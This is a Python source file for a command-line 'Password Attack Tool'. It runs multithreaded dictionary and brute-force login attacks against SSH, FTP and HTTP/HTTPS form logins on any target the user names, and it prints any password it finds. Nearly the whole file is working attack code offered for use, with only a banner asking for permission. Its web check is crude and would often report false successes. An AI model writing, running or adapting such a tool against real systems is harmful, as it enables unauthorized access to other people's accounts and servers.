#!/usr/bin/env python3
"""
Password Attack Tool - A simple tool for password attacks
Author: Codegen
"""

import argparse
import itertools
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
    import paramiko
    from ftplib import FTP
except ImportError:
    print("Required dependencies not found. Install them using:")
    print("pip install requests paramiko")
    sys.exit(1)

class PasswordAttacker:
    def __init__(self, target, username, port=None, wordlist=None, method="dictionary", 
                 service="http", timeout=5, max_threads=10, verbose=False):
        self.target = target
        self.username = username
        self.port = port
        self.wordlist = wordlist
        self.method = method
        self.service = service.lower()
        self.timeout = timeout
        self.max_threads = max_threads
        self.verbose = verbose
        self.found = False
        self.password = None
        
        # Set default ports based on service
        if not self.port:
            if self.service == "ssh":
                self.port = 22
            elif self.service == "ftp":
                self.port = 21
            elif self.service == "http":
                self.port = 80
            elif self.service == "https":
                self.port = 443
    
    def log(self, message):
        """Print message if verbose mode is enabled"""
        if self.verbose:
            print(f"[*] {message}")
    
    def try_password(self, password):
        """Try a single password against the target"""
        if self.found:
            return False
        
        self.log(f"Trying password: {password}")
        
        try:
            if self.service == "ssh":
                return self.try_ssh(password)
            elif self.service == "ftp":
                return self.try_ftp(password)
            elif self.service in ["http", "https"]:
                return self.try_web(password)
            else:
                print(f"[!] Unsupported service: {self.service}")
                return False
        except Exception as e:
            self.log(f"Error trying password {password}: {str(e)}")
            return False
    
    def try_ssh(self, password):
        """Try SSH login"""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            client.connect(
                self.target,
                port=self.port,
                username=self.username,
                password=password,
                timeout=self.timeout
            )
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception:
            return False
    
    def try_ftp(self, password):
        """Try FTP login"""
        ftp = FTP()
        try:
            ftp.connect(self.target, self.port, timeout=self.timeout)
            ftp.login(self.username, password)
            ftp.quit()
            return True
        except Exception:
            return False
    
    def try_web(self, password):
        """Try web form login (basic implementation)"""
        # This is a simplified example. In real scenarios, you'd need to:
        # 1. Analyze the login form to get field names and submission URL
        # 2. Handle CSRF tokens
        # 3. Check for success indicators in response
        
        protocol = "https" if self.service == "https" else "http"
        url = f"{protocol}://{self.target}:{self.port}/login"
        
        try:
            data = {
                "username": self.username,
                "password": password
            }
            
            response = requests.post(url, data=data, timeout=self.timeout)
            
            # This is a simplified check - in real scenarios you'd need to
            # check for specific success/failure indicators
            if response.status_code == 200 and "login failed" not in response.text.lower():
                return True
            return False
        except Exception:
            return False
    
    def dictionary_attack(self):
        """Perform dictionary attack using provided wordlist"""
        if not self.wordlist:
            print("[!] Wordlist is required for dictionary attack")
            return False
        
        try:
            with open(self.wordlist, 'r', encoding='latin-1') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Error reading wordlist: {str(e)}")
            return False
        
        print(f"[+] Starting dictionary attack against {self.target} ({self.service})...")
        print(f"[+] Loaded {len(passwords)} passwords from {self.wordlist}")
        
        return self.run_attack(passwords)
    
    def brute_force_attack(self, min_length=3, max_length=8, charset=None):
        """Perform brute force attack with specified parameters"""
        if not charset:
            charset = string.ascii_lowercase + string.digits
        
        print(f"[+] Starting brute force attack against {self.target} ({self.service})...")
        print(f"[+] Character set: {charset}")
        print(f"[+] Min length: {min_length}, Max length: {max_length}")
        
        passwords = []
        for length in range(min_length, max_length + 1):
            for combo in itertools.product(charset, repeat=length):
                password = ''.join(combo)
                passwords.append(password)
                
                # Process in batches to avoid memory issues
                if len(passwords) >= 10000:
                    if self.run_attack(passwords):
                        return True
                    passwords = []
                    
                # If password found in another thread
                if self.found:
                    return True
        
        # Process any remaining passwords
        if passwords:
            return self.run_attack(passwords)
        
        return False
    
    def run_attack(self, passwords):
        """Run the attack using multiple threads"""
        start_time = time.time()
        attempts = 0
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            
            for password in passwords:
                if self.found:
                    break
                
                future = executor.submit(self.try_password, password)
                futures.append((future, password))
                attempts += 1
            
            for future, password in futures:
                if future.result():
                    self.found = True
                    self.password = password
                    print(f"\n[+] Password found: {password}")
                    print(f"[+] Username: {self.username}")
                    print(f"[+] Target: {self.target}")
                    print(f"[+] Service: {self.service}")
                    return True
                
                if self.found:
                    break
        
        elapsed_time = time.time() - start_time
        print(f"\n[*] Attack completed in {elapsed_time:.2f} seconds")
        print(f"[*] Tried {attempts} passwords")
        
        if not self.found:
            print("[!] Password not found")
        
        return self.found
    
    def attack(self):
        """Start the attack based on the specified method"""
        if self.method == "dictionary":
            return self.dictionary_attack()
        elif self.method == "brute":
            return self.brute_force_attack()
        else:
            print(f"[!] Unsupported attack method: {self.method}")
            return False


def main():
    parser = argparse.ArgumentParser(description="Password Attack Tool")
    parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
    parser.add_argument("-u", "--username", required=True, help="Username to try")
    parser.add_argument("-p", "--port", type=int, help="Port number (default depends on service)")
    parser.add_argument("-w", "--wordlist", help="Path to wordlist file for dictionary attack")
    parser.add_argument("-m", "--method", choices=["dictionary", "brute"], default="dictionary",
                        help="Attack method: dictionary or brute force (default: dictionary)")
    parser.add_argument("-s", "--service", choices=["ssh", "ftp", "http", "https"], default="http",
                        help="Service to attack: ssh, ftp, http, https (default: http)")
    parser.add_argument("-T", "--timeout", type=int, default=5, 
                        help="Connection timeout in seconds (default: 5)")
    parser.add_argument("-x", "--max-threads", type=int, default=10,
                        help="Maximum number of threads (default: 10)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    
    # Brute force specific options
    parser.add_argument("--min-length", type=int, default=3, 
                        help="Minimum password length for brute force (default: 3)")
    parser.add_argument("--max-length", type=int, default=8,
                        help="Maximum password length for brute force (default: 8)")
    parser.add_argument("--charset", default=None,
                        help="Character set for brute force (default: lowercase + digits)")
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.method == "dictionary" and not args.wordlist:
        parser.error("Dictionary attack requires a wordlist (-w/--wordlist)")
    
    # Create attacker instance
    attacker = PasswordAttacker(
        target=args.target,
        username=args.username,
        port=args.port,
        wordlist=args.wordlist,
        method=args.method,
        service=args.service,
        timeout=args.timeout,
        max_threads=args.max_threads,
        verbose=args.verbose
    )
    
    # Start the attack
    if args.method == "brute":
        charset = args.charset if args.charset else string.ascii_lowercase + string.digits
        attacker.brute_force_attack(
            min_length=args.min_length,
            max_length=args.max_length,
            charset=charset
        )
    else:
        attacker.attack()


if __name__ == "__main__":
    banner = """
    ╔═══════════════════════════════════════════════╗
    ║                                               ║
    ║   Password Attack Tool                        ║
    ║   A simple tool for password attacks          ║
    ║                                               ║
    ║   Use responsibly and only on systems you     ║
    ║   have permission to test!                    ║
    ║                                               ║
    ╚═══════════════════════════════════════════════╝
    """
    print(banner)
    main()

